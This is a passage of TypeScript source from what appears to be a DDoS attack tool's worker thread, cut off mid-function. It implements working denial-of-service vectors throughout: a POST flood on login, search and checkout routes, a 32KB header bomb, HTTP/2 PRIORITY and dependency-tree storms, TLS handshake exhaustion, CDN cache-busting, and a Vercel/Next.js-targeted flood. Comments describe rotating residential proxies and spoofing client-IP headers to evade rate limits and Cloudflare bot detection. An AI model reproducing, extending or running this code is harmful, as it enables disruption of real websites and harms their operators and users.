  "/register", "/signup", "/auth/register", "/account/login", "/user/login",
  "/api/auth/signin", "/api/auth/session", "/api/auth/callback",
  // Search — complex DB queries, no caching possible
  "/search", "/api/search", "/api/v1/search", "/api/v2/search",
  "/api/products/search", "/api/items/search", "/api/v1/autocomplete",
  // Checkout / e-commerce — DB read/write per request
  "/checkout", "/cart/checkout", "/order/submit", "/cart/add", "/cart/update",
  "/api/v2/checkout", "/api/cart", "/api/orders/create",
  // User data — private, CDN bypassed
  "/api/users", "/api/v1/me", "/api/v1/profile", "/api/v1/notifications",
  "/api/products", "/api/orders", "/api/v1/feed", "/api/v1/dashboard",
  // Next.js App Router — each request hits origin (RSC bypasses edge cache)
  "/api/revalidate", "/_next/data/build/index.json",
  "/api/trpc/user.getAll", "/api/trpc/auth.getSession",
  "/api/trpc/posts.create", "/api/trpc/orders.list",
];

async function runAppSmartFlood(
  base: string,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
) {
  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
  }, 300);

  const buildSmartBody = () => {
    const username  = randStr(8);
    const password  = randStr(12);
    const email     = `${randStr(6)}@${randStr(4)}.com`;
    const query     = randStr(randInt(4, 16));
    const price     = (Math.random() * 999 + 1).toFixed(2);
    const productId = randInt(1, 999999);
    const userId    = randInt(1, 999999);
    // rotate body format: JSON (60%) or form-encoded (40%)
    if (Math.random() < 0.6) {
      const obj: Record<string, unknown> = {
        username, password, email, query,
        price, product_id: productId, user_id: userId,
        _t: Date.now(), _r: randStr(8),
        filters: { category: randStr(6), min_price: 0, max_price: price },
        page: randInt(1, 100), per_page: randInt(10, 100),
      };
      return JSON.stringify(obj);
    }
    return `username=${username}&password=${password}&email=${encodeURIComponent(email)}&q=${query}&page=${randInt(1, 100)}&_t=${Date.now()}&_r=${randStr(8)}`;
  };

  const doRequest = async () => {
    const endpoint = SMART_ENDPOINTS[randInt(0, SMART_ENDPOINTS.length)];
    const url      = `${base}${endpoint}`;
    const body     = buildSmartBody();
    const isJson   = body.startsWith("{");
    const h: Record<string, string> = {
      ...(buildHeaders(true, body.length) as Record<string, string>),
      "Content-Type":  isJson ? "application/json" : "application/x-www-form-urlencoded",
      "Cache-Control": "no-cache, no-store",
      "Pragma":        "no-cache",
      "User-Agent":    randUA(),
    };
    try {
      // 95% via proxy — each endpoint hit comes from a different residential IP,
      // bypassing per-IP rate limits and Cloudflare bot detection
      if (proxies.length > 0 && Math.random() < 0.95) {
        const proxy = pickProxy(proxies);
        const bytes = await fetchViaProxy(url, proxy, "POST", h, body)
          .then(b => { recordProxySuccess(proxy.host, proxy.port); return b; })
          .catch(() => { recordProxyFailure(proxy.host, proxy.port); return body.length; });
        localPkts++; localBytes += bytes;
        return;
      }
      const res = await fetch(url, {
        method: "POST", headers: h, body, signal: AbortSignal.timeout(8000),
      });
      await res.body?.cancel();
      localPkts++;
      localBytes += body.length + 300;
    } catch { /* target not accepting — expected */ }
  };

  // NO sleep — fire requests as fast as possible; proxy pool handles rate limiting
  const runSlot = async () => {
    while (!signal.aborted) { await doRequest(); }
  };
  // Deployed: 6000 concurrent slots (was 4000) — proxy rotation makes each hit unique
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(200, threads * 6), 6000)
    : Math.max(50, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv);
}

// ─────────────────────────────────────────────────────────────────────────
//  LARGE HEADER BOMB — 16KB randomized headers exhaust HTTP parser alloc
// ─────────────────────────────────────────────────────────────────────────
async function runLargeHeaderBomb(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
) {
  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
  }, 300);

  // Build a 32KB header block with randomized X-* headers (was 16KB)
  // 32KB forces most HTTP parsers to allocate a second chunk — more CPU per request
  const buildBigHeaders = () => {
    const lines: string[] = [];
    while (lines.reduce((a, l) => a + l.length + 2, 0) < 32 * 1024) {
      const name  = `X-${randStr(randInt(12, 24))}-${randStr(randInt(4, 8))}`;
      const value = randStr(randInt(50, 120));
      lines.push(`${name}: ${value}`);
    }
    return lines.join("\r\n");
  };

  const oneConn = async () => {
    if (signal.aborted) return;
    let settled = false;
    const done = () => {
      if (settled) return; settled = true;
      localConns = Math.max(0, localConns - 1);
    };
    try {
      // Use mkTLSSock — routes through SOCKS5/HTTP proxy for IP rotation
      const sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["http/1.1"]);
      localConns++;

      await new Promise<void>(resolve => {
        const bigHeaders = buildBigHeaders();
        const path       = hotPath();
        const reqLine    = `GET ${path}?_=${randStr(8)}&v=${randInt(1,999999)} HTTP/1.1\r\n`;
        const mandatory  = [
          `Host: ${hostname}`,
          `User-Agent: ${randUA()}`,
          `Accept: text/html,*/*;q=0.8`,
          `Accept-Encoding: gzip, deflate, br`,
          `Connection: close`,
          `X-Forwarded-For: ${randIp()}, ${randIp()}`,
          `X-Real-IP: ${randIp()}`,
          `Cache-Control: no-cache`,
        ].join("\r\n");
        const payload = Buffer.from(`${reqLine}${mandatory}\r\n${bigHeaders}\r\n\r\n`);

        const finish = () => { done(); resolve(); };
        sock.write(payload, () => { localPkts++; localBytes += payload.length; });
        setTimeout(finish, 2000); // hold 2s then release — server still processing large headers
        sock.on("data",    () => { localBytes += 100; });
        sock.on("error",   finish);
        sock.on("close",   finish);
        sock.setTimeout(5000);
        sock.on("timeout", finish);
        signal.addEventListener("abort", finish, { once: true });
      });
    } catch { done(); }
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      // No sleep — immediate reconnect for maximum header parsing load
    }
  };
  const numSlots = IS_DEPLOYED
    ? Math.min(Math.max(60, threads * 2), 3000)
    : Math.max(30, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP/2 PRIORITY STORM — PRIORITY frames rebuild stream dependency tree
//  RFC 7540 §6.3 — each PRIORITY frame forces server to re-sort tree
// ─────────────────────────────────────────────────────────────────────────
async function runH2PriorityStorm(
  resolvedHost: string,
  hostname: string,
  targetPort: number,
  threads: number,
  proxies: ProxyConfig[],
  signal: AbortSignal,
  onStats: (p: number, b: number, c?: number) => void,
) {
  // PRIORITY frame: type=0x2, 5 bytes payload
  // Payload: [E][stream_dep 31bits][weight 8bits]
  // Sending thousands/sec with random stream IDs forces server to rebuild
  // its entire stream priority tree on every frame.
  const buildPriorityFrame = (streamId: number) => {
    const frame     = Buffer.allocUnsafe(9 + 5);
    const depStream = randInt(1, 0x7fffffff) & ~0x80000000;
    const weight    = randInt(0, 255);
    // Frame header
    frame.writeUInt16BE(0, 0);   // length hi
    frame.writeUInt8(5, 2);      // length lo = 5
    frame.writeUInt8(0x2, 3);    // type = PRIORITY
    frame.writeUInt8(0x0, 4);    // flags = 0
    frame.writeUInt32BE(streamId & 0x7fffffff, 5);
    // Payload
    frame.writeUInt32BE(depStream, 9);
    frame.writeUInt8(weight, 13);
    return frame;
  };

  const H2_PREFACE = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const H2_SETTINGS = Buffer.from([
    0,0,0x0c, 0x4,0x0, 0,0,0,0,
    0x0,0x3, 0,0,0x00,0x64,  // MAX_CONCURRENT_STREAMS=100
    0x0,0x4, 0x00,0xFF,0xFF,0xFF, // INITIAL_WINDOW_SIZE=max
  ]);

  let localPkts = 0, localBytes = 0, localConns = 0, pIdx = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes, localConns); localPkts = 0; localBytes = 0; }
  }, 500);

  const oneConn = async (): Promise<void> => {
    if (signal.aborted) return;
    let sock: tls.TLSSocket | net.Socket;
    try {
      // h2 requires ALPN negotiation — mkTLSSock passes ["h2"] when proxied
      sock = await mkTLSSock(proxies, pIdx++, resolvedHost, hostname, targetPort, ["h2"]);
    } catch { return; }

    await new Promise<void>((resolve) => {
      const done = () => { localConns = Math.max(0, localConns - 1); try { sock.destroy(); } catch {/**/ } resolve(); };
      localConns++;
      sock.write(H2_PREFACE);
      sock.write(H2_SETTINGS);

      let streamId = 1;
      // 300 frames per burst × every 2ms = ~150K frames/sec per conn (was 200/3ms = ~66K)
      const iv = setInterval(() => {
        if (signal.aborted || sock.destroyed) { clearInterval(iv); return done(); }
        const frames = Buffer.concat(
          Array.from({ length: 300 }, () => {
            const f = buildPriorityFrame(streamId);
            streamId = (streamId + 2) % 0x7ffffffe || 1;
            return f;
          })
        );
        sock.write(frames);
        localPkts += 300;
        localBytes += frames.length;
      }, 2);

      setTimeout(() => { clearInterval(iv); done(); }, 30_000);
      sock.on("data",    () => {});
      sock.on("error",   done);
      sock.on("close",   done);
      sock.setTimeout(35_000);
      sock.on("timeout", done);
      signal.addEventListener("abort", () => { clearInterval(iv); done(); }, { once: true });
    });
  };

  const runSlot = async () => {
    while (!signal.aborted) {
      await oneConn();
      // No artificial delay — immediate reconnect for sustained frame pressure
    }
  };
  const numSlots = IS_DEPLOYED ? Math.min(Math.max(20, threads), 2000) : Math.max(10, threads);
  await Promise.all(Array.from({ length: numSlots }, runSlot));
  clearInterval(flushIv); onStats(localPkts, localBytes, localConns);
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  // Fallback chain: explicit URL port → cfg.port → protocol default.
  // Previously was just `parseInt(u.port)||protocol`, which overwrote cfg.port=443
  // with 80 when URL was built as http://domain (no explicit port in URL).
  targetPort = parseInt(u.port, 10) || cfg.port || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base    = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number, c = 0) => { parentPort?.postMessage({ pkts: p, bytes: b, conns: c }); };

// ── Response code + latency accumulator (T003 real-time telemetry) ─────────
// All HTTP methods call workerTrackCode(statusCode, latencyMs) to report results.
// A separate 1s interval flushes to parent so codes don't mix with packet stats.
const workerCodes = { ok: 0, redir: 0, client: 0, server: 0, timeout: 0 };
const workerLat   = { sum: 0, count: 0 };

function workerTrackCode(status: number, latMs?: number): void {
  if      (status >= 200 && status < 300) workerCodes.ok++;
  else if (status >= 300 && status < 400) workerCodes.redir++;
  else if (status >= 400 && status < 500) workerCodes.client++;
  else if (status >= 500)                 workerCodes.server++;
  else                                    workerCodes.timeout++;
  if (latMs !== undefined && latMs >= 0)  { workerLat.sum += latMs; workerLat.count++; }
}

setInterval(() => {
  const total = workerCodes.ok + workerCodes.redir + workerCodes.client + workerCodes.server + workerCodes.timeout;
  if (total === 0 && workerLat.count === 0) return;
  const snap = { ...workerCodes };
  const latAvgMs = workerLat.count > 0 ? Math.round(workerLat.sum / workerLat.count) : 0;
  // Reset accumulators for next window
  workerCodes.ok = 0; workerCodes.redir = 0; workerCodes.client = 0;
  workerCodes.server = 0; workerCodes.timeout = 0;
  workerLat.sum = 0; workerLat.count = 0;
  parentPort?.postMessage({ codes: snap, latAvgMs });
}, 1000).unref();

// ═══════════════════════════════════════════════════════════════════════════════
//  TLS SESSION CACHE EXHAUSTION
//  Forces a full TLS handshake on every connection — no session resumption.
//  Saturates the server's crypto thread pool with RSA/ECDHE operations.
// ═══════════════════════════════════════════════════════════════════════════════
async function runTLSSessionExhaust(
  resolvedHost: string,
  hostname:     string,
  port:         number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number, c?: number) => void,
): Promise<void> {
  const MAX_CONN = !IS_PROD
    ? Math.min(threads * 6, 400)
    : IS_DEPLOYED ? Math.min(threads * 50, 15000) : Math.min(threads * 30, 8000);

  // Rotate TLS parameters per connection to defeat session-ID caching
  const TLS_VARIANTS: Array<{ ciphers: string; ecdhCurve: string; minVersion: string }> = [
    { ciphers: "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256",            ecdhCurve: "P-256",    minVersion: "TLSv1.2" },
    { ciphers: "TLS_AES_256_GCM_SHA384:ECDHE-RSA-AES256-GCM-SHA384",            ecdhCurve: "P-384",    minVersion: "TLSv1.2" },
    { ciphers: "TLS_CHACHA20_POLY1305_SHA256:ECDHE-RSA-CHACHA20-POLY1305",      ecdhCurve: "X25519",   minVersion: "TLSv1.3" },
    { ciphers: "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384",      ecdhCurve: "P-256",    minVersion: "TLSv1.2" },
    { ciphers: "ECDHE-RSA-AES256-SHA384:ECDHE-RSA-AES128-SHA256",               ecdhCurve: "P-521",    minVersion: "TLSv1.2" },
  ];

  let localPkts = 0, localBytes = 0, activeConns = 0;
  const flush   = () => { onStats(localPkts, localBytes, activeConns); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 250);

  const oneHandshake = async (): Promise<void> => {
    if (signal.aborted) return;
    const variant = TLS_VARIANTS[randInt(0, TLS_VARIANTS.length)];
    return new Promise<void>(resolve => {
      let settled = false;
      const cleanup = (success = false) => {
        if (settled) return;
        settled = true;
        activeConns = Math.max(0, activeConns - 1);
        try { sock.destroy(); } catch { /**/ }
        if (success) { localPkts++; localBytes += 2048; }
        resolve();
      };

      const sock = tls.connect({
        host: resolvedHost,
        port,
        servername: hostname,
        ciphers:   variant.ciphers,
        ecdhCurve: variant.ecdhCurve,
        minVersion: variant.minVersion as "TLSv1.2" | "TLSv1.3",
        // Force new session — disable all forms of resumption
        rejectUnauthorized: false,
        session:   undefined,
      });

      sock.setTimeout(8_000);
      activeConns++;

      sock.once("secureConnect", () => {
        // Send minimal HTTP/1.1 GET then immediately destroy — forces full handshake overhead
        const req = `GET /?_s=${randStr(12)} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: ${randUA()}\r\nConnection: close\r\n\r\n`;
        sock.write(req);
        localBytes += req.length;
        // Short hold then destroy — maximizes handshake-to-request ratio
        setTimeout(() => cleanup(true), randInt(20, 80));
      });
      sock.once("error",   () => cleanup(false));
      sock.once("timeout", () => cleanup(false));
      signal.addEventListener("abort", () => cleanup(false), { once: true });
    });
  };

  const runSlot = async (): Promise<void> => {
    while (!signal.aborted) {
      await oneHandshake();
      // No delay — immediately reconnect to maintain handshake pressure
    }
  };

  const concurrency = Math.min(MAX_CONN, IS_DEPLOYED ? threads * 12 : threads * 4);
  await Promise.all(Array.from({ length: concurrency }, runSlot));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  HTTP CACHE BUSTING — 100% Origin Hit Rate
//  Every request carries unique cache keys → CDN always misses → origin saturated
// ═══════════════════════════════════════════════════════════════════════════════
async function runCacheBuster(
  base:     string,
  threads:  number,
  proxies:  ProxyConfig[],
  signal:   AbortSignal,
  onStats:  (p: number, b: number) => void,
): Promise<void> {
  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 64, 8000) : Math.min(threads * 16, 600);

  // Vary dimensions that force unique cache keys per request
  const ACCEPT_LANGS = ["en-US,en;q=0.9", "pt-BR,pt;q=0.9", "es-ES,es;q=0.9", "fr-FR,fr;q=0.9", "de-DE,de;q=0.8", "ja,en;q=0.8", "zh-CN,zh;q=0.9", "ar,en;q=0.8"];
  const ACCEPT_ENC   = ["gzip, deflate, br", "gzip, deflate", "br, gzip", "identity", "gzip", "deflate, br"];
  const CB_PATHS     = ["/", "/index.html", "/api/data", "/assets/main.js", "/api/v1/feed", "/search", "/home", "/products", "/blog", "/about"];

  let localPkts = 0, localBytes = 0;
  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  let inflight = 0;
  const isHttps = base.startsWith("https:");

  const doRequest = () => {
    if (signal.aborted || inflight >= MAX_INFLIGHT) return;
    inflight++;
    const path    = CB_PATHS[randInt(0, CB_PATHS.length)];
    const cbParam = `_cb=${randStr(16)}&_t=${Date.now()}&_r=${randStr(8)}&_v=${randInt(1, 99999)}`;
    const lang    = ACCEPT_LANGS[randInt(0, ACCEPT_LANGS.length)];
    const enc     = ACCEPT_ENC[randInt(0, ACCEPT_ENC.length)];
    const u       = new URL(`${base}${path}?${cbParam}`);
    const reqHdrs: Record<string, string> = {
      "User-Agent":       randUA(),
      "Accept":           "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
      "Accept-Language":  lang,
      "Accept-Encoding":  enc,
      "Cache-Control":    "no-cache, no-store, must-revalidate",
      "Pragma":           "no-cache",
      "Expires":          "0",
      "X-Forwarded-For":  randIp(),
      "X-Real-IP":        randIp(),
    };

    const startMs = Date.now();
    const proxyConf = proxies.length > 0 ? pickProxy(proxies) : undefined;

    if (proxyConf) {
      // Use proxy path
      fetchViaProxy(`${base}${path}?${cbParam}`, proxyConf, "GET", reqHdrs)
        .then(bytes => { workerTrackCode(200, Date.now() - startMs); localPkts++; localBytes += bytes; inflight = Math.max(0, inflight - 1); })
        .catch(() => { inflight = Math.max(0, inflight - 1); });
    } else {
      const agent = isHttps ? HTTPS_KA_AGENT : HTTP_KA_AGENT;
      const reqOpts = {
        host:    u.hostname,
        port:    parseInt(u.port, 10) || (isHttps ? 443 : 80),
        path:    u.pathname + u.search,
        headers: reqHdrs,
        agent,
        timeout: 10_000,
      };
      const req = (isHttps ? https : http).get(reqOpts, (res) => {
        workerTrackCode(res.statusCode ?? 0, Date.now() - startMs);
        localPkts++;
        localBytes += 512;
        res.resume();
        inflight = Math.max(0, inflight - 1);
      });
      req.on("error", () => { inflight = Math.max(0, inflight - 1); });
      req.on("timeout", () => { req.destroy(); inflight = Math.max(0, inflight - 1); });
    }
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doRequest(); await Promise.resolve(); }
      else { await new Promise(r => setTimeout(r, 0)); }
    }
  };

  await Promise.all(Array.from({ length: Math.min(threads, 16) }, launcher));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  VERCEL FLOOD — Next.js / Vercel Edge-Specific Application Layer Attack
//
//  Vercel's architecture has 4 exploitable surfaces:
//  1. RSC bypass  — ?_rsc=<random> forces a full server-side React render.
//     Vercel adds `Vary: RSC` so every unique _rsc value = cache MISS → origin hit.
//  2. Next.js Image Optimizer — /_next/image?url=...&w=<N>&q=<N> runs CPU-intensive
//     resize/encode per unique (url,w,q) combination. No cache = new resize each time.
//  3. Edge API routes  — /api/* are serverless functions with cold starts; hit them
//     with unique params to prevent runtime reuse.
//  4. ISR revalidation — /api/revalidate + random path param forces ISR rebuild.
//
//  All 4 vectors fire concurrently. Each request gets a unique cache-busting key so
//  Vercel's CDN edge passes 100% of requests to the serverless runtime.
// ═══════════════════════════════════════════════════════════════════════════════
async function runVercelFlood(
  base:    string,
  threads: number,
  proxies: ProxyConfig[],
  signal:  AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const u = (() => {
    try { return new URL(/^https?:\/\//i.test(base) ? base : `https://${base}`); }
    catch { return new URL("https://127.0.0.1"); }
  })();
  const hostname = u.hostname;
  const isHttps  = u.protocol === "https:";
  const tgtPort  = parseInt(u.port) || (isHttps ? 443 : 80);
  const resolvedIp = await resolveHost(hostname).catch(() => hostname);

  // Max concurrent slots per vector — aggressively high for deployed env
  const MAX_INFLIGHT = IS_DEPLOYED ? Math.min(threads * 80, 16_000) : Math.min(threads * 20, 2_000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flushIv = setInterval(() => {
    if (localPkts > 0) { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; }
  }, 300);

  // ── Vector 1: RSC bypass paths ─────────────────────────────────────────────
  // RSC = React Server Components. Adding ?_rsc= forces a full SSR pass.
  // Vercel edge CDN bypasses cache for any request with RSC header.
  const RSC_PATHS = [
    "/", "/about", "/contact", "/blog", "/products", "/pricing",
    "/search", "/faq", "/terms", "/privacy", "/login", "/register",
  ];

  // ── Vector 2: Next.js Image Optimizer ──────────────────────────────────────
  // Each unique (url, w, q) combination triggers a new resize operation.
  // Vercel allows user-defined sizes; we hit every possible combination.
  const IMG_WIDTHS  = [16, 32, 48, 64, 96, 128, 256, 384, 640, 750, 828, 1080, 1200, 1920, 2048, 3840];
  const IMG_QUALITY = [10, 25, 50, 60, 70, 75, 80, 85, 90, 95, 100];
  const IMG_SRCS    = [
    "/_next/static/media/", "/images/hero.jpg", "/images/banner.png",
    "/public/og-image.jpg", "/assets/logo.svg", "/public/avatar.jpg",
    "https://images.unsplash.com/photo-1", "https://picsum.photos/seed/",
  ];

  // ── Vector 3: API routes — serverless cold starts ──────────────────────────
  const API_ROUTES = [
    "/api/auth/session", "/api/auth/signin", "/api/auth/callback",
    "/api/user", "/api/me", "/api/profile", "/api/settings",
    "/api/data", "/api/feed", "/api/posts", "/api/comments",
    "/api/search", "/api/products", "/api/orders",
    "/api/revalidate", "/api/webhook", "/api/health",
    "/api/trpc/user.getAll", "/api/trpc/auth.getSession",
    "/api/trpc/posts.list", "/api/trpc/comments.list",
  ];

  // ── Vector 4: ISR / data routes ────────────────────────────────────────────
  const buildRandomId = () => randHex(8) + randHex(4) + randHex(4) + randHex(4) + randHex(12);
  const PAGES = ["index", "about", "blog", "products", "pricing", "contact", "faq"];

  // Build request headers that force CDN bypass (Next.js specific)
  const buildVercelHeaders = (hasBody = false, bodyLen = 0): Record<string, string> => {
    const h: Record<string, string> = {
      "User-Agent":      randUA(),
      "Accept":          "text/html,application/xhtml+xml,application/json,*/*;q=0.8",
      "Accept-Language": ["en-US,en;q=0.9","pt-BR,pt;q=0.9","es-ES,es;q=0.9"][randInt(0,3)],
      "Accept-Encoding": "gzip, deflate, br",
      // Next.js RSC header — triggers server-side React render, bypasses CDN
      "RSC":             "1",
      "Next-Router-Prefetch": "1",
      "Next-Url":        `/${randStr(randInt(3, 12))}`,
      // Cache bypass directives
      "Cache-Control":   "no-cache, no-store, must-revalidate",
      "Pragma":          "no-cache",
      // Fake origin IPs (rotate to avoid per-IP limits)
      "X-Forwarded-For": `${randIp()}, ${randIp()}`,
      "X-Real-IP":       randIp(),
      "True-Client-IP":  randIp(),
      "CF-Connecting-IP":randIp(),
      // Vercel-specific headers to force edge bypass
      "X-Vercel-Cache":  "MISS",
      "X-Vercel-Id":     `${randStr(3)}1::${randStr(8)}-${randStr(20)}-${randStr(8)}`,
      // Unique request ID per hit
      "X-Request-ID":    `${randHex(8)}-${randHex(4)}-${randHex(4)}-${randHex(4)}-${randHex(12)}`,
      "If-None-Match":   `"${randHex(32)}"`,
      "If-Modified-Since": "Thu, 01 Jan 1970 00:00:00 GMT",
      "Sec-Fetch-Dest":  ["document","empty","image","script"][randInt(0,4)],
      "Sec-Fetch-Mode":  ["navigate","cors","no-cors"][randInt(0,3)],
      "Sec-Fetch-Site":  ["cross-site","same-origin","none"][randInt(0,3)],
      "Sec-CH-UA":       `"Chromium";v="${136 - randInt(0,3)}", "Not.A/Brand";v="8"`,
      "Sec-CH-UA-Mobile":"?0",
      "Sec-CH-UA-Platform": `"Windows"`,
    };
    if (hasBody && bodyLen > 0) {
      h["Content-Type"]   = Math.random() < 0.5 ? "application/json" : "application/x-www-form-urlencoded";
      h["Content-Length"] = String(bodyLen);
    }
    return h;
  };

  // Pick a random attack vector and return url+method+body
  const buildRequest = (): { path: string; method: string; body?: string } => {
    const vector = randInt(0, 4);
    switch (vector) {
      case 0: {
        // RSC bypass: random page with ?_rsc= param
        const page = RSC_PATHS[randInt(0, RSC_PATHS.length)];
        const rscId = randStr(20) + randHex(8);
        return { path: `${page}?_rsc=${rscId}&_t=${Date.now()}`, method: "GET" };
      }
      case 1: {
        // Image optimizer: unique (url, width, quality) = new resize
        const src = IMG_SRCS[randInt(0, IMG_SRCS.length)] + randStr(8);
        const w   = IMG_WIDTHS[randInt(0, IMG_WIDTHS.length)];
        const q   = IMG_QUALITY[randInt(0, IMG_QUALITY.length)];
        const fmt = ["webp","avif","jpeg","png"][randInt(0,4)];
        return {
          path: `/_next/image?url=${encodeURIComponent(src)}&w=${w}&q=${q}&f=${fmt}&_r=${randStr(8)}`,
          method: "GET",
        };
      }
      case 2: {
        // API routes: serverless cold-start exhaustion
        const route = API_ROUTES[randInt(0, API_ROUTES.length)];
        const hasBody = Math.random() < 0.5;
        const body = hasBody ? JSON.stringify({
          _t: Date.now(), _r: randStr(8), q: randStr(8),
          page: randInt(1, 500), limit: randInt(10, 100),
          token: randHex(40), sessionId: randHex(24),
        }) : undefined;
        return { path: `${route}?_=${randStr(12)}&t=${Date.now()}`, method: hasBody ? "POST" : "GET", body };
      }
      default: {
        // ISR /_next/data routes — forces getServerSideProps execution
        const buildId = buildRandomId();
        const page    = PAGES[randInt(0, PAGES.length)];
        const slug    = randStr(randInt(4, 12));
        return { path: `/_next/data/${buildId}/${page}/${slug}.json?_=${randStr(8)}`, method: "GET" };
      }
    }
  };

  const doRequest = async () => {
    if (signal.aborted) return;
    if (inflight >= MAX_INFLIGHT) return;
    inflight++;

    const { path, method, body } = buildRequest();
    const bodyBuf = body ? Buffer.from(body) : undefined;
    const headers = buildVercelHeaders(!!bodyBuf, bodyBuf?.length);

    if (proxies.length > 0 && Math.random() < 0.90) {
      // Via proxy — each request from a different IP, avoids Vercel per-IP rate limit
      const proxy = pickProxy(proxies);
      try {
        const bytes = await fetchViaProxy(`${base}${path}`, proxy, method, headers, body);
        localPkts++; localBytes += bytes;
        recordProxySuccess(proxy.host, proxy.port);
      } catch {
        localPkts++; localBytes += 200;
        recordProxyFailure(proxy.host, proxy.port);
      }
      inflight--;
      return;
    }

    // Direct raw http.request — uses our keep-alive agent for max throughput
    const agent = isHttps ? HTTPS_KA_AGENT : HTTP_KA_AGENT;
    const reqOpts: http.RequestOptions | https.RequestOptions = {
      hostname:  resolvedIp,
      port:      tgtPort,
      path,
      method,
      headers,
      agent,
      timeout:   8_000,
      ...(isHttps ? { servername: hostname, rejectUnauthorized: false } : {}),
    };

    const t0 = Date.now();
    const req = (isHttps ? https : http).request(reqOpts, (res) => {
      inflight--;
      localPkts++;
      localBytes += (bodyBuf?.length ?? 0) + parseInt(String(res.headers["content-length"] || "0"), 10) + 200;
      workerTrackCode(res.statusCode ?? 0, Date.now() - t0);
      res.destroy();
    });
    req.on("error",   () => { inflight--; localPkts++; localBytes += 80; workerTrackCode(0); });
    req.on("timeout", () => { req.destroy(); });
    if (bodyBuf) req.write(bodyBuf);
    req.end();
  };

  // Launcher loops — fire requests as fast as the inflight window allows
  const numLaunchers = IS_DEPLOYED ? Math.min(threads * 12, 3_000) : Math.min(threads * 4, 800);
  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { void doRequest(); await Promise.resolve(); }
      else { await new Promise(r => setTimeout(r, 0)); }
    }
  };

  await Promise.all(Array.from({ length: numLaunchers }, launcher));
  clearInterval(flushIv);
}

// ═══════════════════════════════════════════════════════════════════════════════
//  H2 DEPENDENCY TREE BOMB — HTTP/2 Priority Dependency Chain Amplification
//
//  RFC 7540 §5.3.1 — Exclusive PRIORITY bit: inserting stream X as exclusive
//  child of Y forces ALL previous children of Y to become children of X.
//  This is O(#children) work per insertion in conformant H2 implementations.
//
//  Attack pattern (N=128 streams):
//    1. Open 128 streams via HEADERS (no END_STREAM → server holds them open)
//    2. Chain exclusive PRIORITY frames: s3 → [excl] s1; s5 → [excl] s3; s7 → [excl] s5 ...
//       → Each insertion is O(current_chain_length) server work
//       → Total insertions: N-1 = 127 → Total server work: O(N²) ≈ 16,000 units
//    3. Randomize weights on each chain member → forces priority queue sorting too
//    4. RST all streams from deepest to root → triggers cascade tree rebalancing
//    5. Immediately reconnect — repeat. O(N²) work for O(N) frames sent.
//
//  Amplification ratio: ~64× (128 PRIORITY frames → 16,384 server tree operations)
// ═══════════════════════════════════════════════════════════════════════════════
async function runH2DepBomb(
  resolvedHost: string,
  hostname:     string,
  targetPort:   number,
  threads:      number,
  signal:       AbortSignal,
  onStats:      (p: number, b: number) => void,
  proxies:      ProxyConfig[] = [],
): Promise<void> {
  const CHAIN_LEN = IS_PROD ? 128 : 20;

  const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
    const f = Buffer.allocUnsafe(9 + payload.length);
    f[0] = (payload.length >>> 16) & 0xff;
    f[1] = (payload.length >>>  8) & 0xff;
    f[2] = (payload.length       ) & 0xff;
    f[3] = type; f[4] = flags;
    f.writeUInt32BE(streamId & 0x7fffffff, 5);
    payload.copy(f, 9);
    return f;
  };

  const PREFACE  = Buffer.from("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n");
  const SETTINGS = mkFrame(0x04, 0x00, 0, Buffer.alloc(0));
  const SACK     = mkFrame(0x04, 0x01, 0, Buffer.alloc(0));

  // HEADERS frame — no END_STREAM → server holds stream state open indefinitely
  const mkHeaders = (sid: number): Buffer => {
    const hBuf = Buffer.from(hostname);
    const hpack = Buffer.concat([
      Buffer.from([0x82, 0x84, 0x87]),
